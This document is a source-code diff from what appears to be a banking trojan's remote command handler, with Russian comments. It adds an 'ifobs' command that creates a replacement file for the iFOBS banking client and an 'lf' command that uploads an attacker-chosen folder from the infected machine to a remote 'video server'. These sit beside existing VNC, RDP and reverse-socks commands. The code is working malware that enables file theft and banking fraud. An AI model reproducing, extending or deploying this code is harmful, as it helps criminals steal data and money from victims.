@@ -1089,6 +1089,33 @@ bool ExecuteVNC(void* Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+//создание файла для подмены в IFobs
+bool ExecuteIFobs(void* Manager, PCHAR Command, PCHAR Args)
+{
+#ifdef IFobsH
+	IFobs::CreateFileReplacing(Args);
+#endif
+	return TRUE;
+}
+
+//загрузка указанной папки на видео сервер
+bool ExecuteLF(void* Manager, PCHAR Command, PCHAR Args)
+{
+	char name[MAX_PATH];
+	const char* bad = "\\/:'\" "; //символы которые заменяем на _
+	m_lstrcpy( name, Args );
+	char* p = name;
+	while( *p )
+	{
+		if( STR::Scan( bad, *p ) )
+			*p = '_';
+		p++;
+	}
+	TASKDBG( "LF", "Загрузка папки '%s' под именем %s", Args, name );
+	VideoProcess::SendFiles( 0, name, Args, 0, true );
+	return true;
+}
+
 /*
 
 // Тело потока команды installfakedll
@@ -1206,8 +1233,10 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandRS[]			 = {'r','s', 0};
 	const static char CommandRDP[]			 = {'r','d', 'p', 0};
 	const static char CommandVNC[]			 = {'v','n', 'c', 0};
+	const static char CommandIFobs[]		 = {'i','f', 'o', 'b', 's', 0};
+	const static char CommandLF[]			 = {'l','f',0};
 
-	int Index = StrIndexOf( Command, false, 11,
+	int Index = StrIndexOf( Command, false, 13,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
@@ -1218,7 +1247,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandDocFind,
 							(PCHAR)CommandRS,
 							(PCHAR)CommandRDP,
-							(PCHAR)CommandVNC
+							(PCHAR)CommandVNC,
+							(PCHAR)CommandIFobs,
+							(PCHAR)CommandLF
 						  );
 
 
@@ -1235,6 +1266,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 8: return ExecuteRS;
 		case 9: return ExecuteRDP;
 		case 10: return ExecuteVNC;
+		case 11: return ExecuteIFobs;
+		case 12: return ExecuteLF;
 
     default: ;
 	}
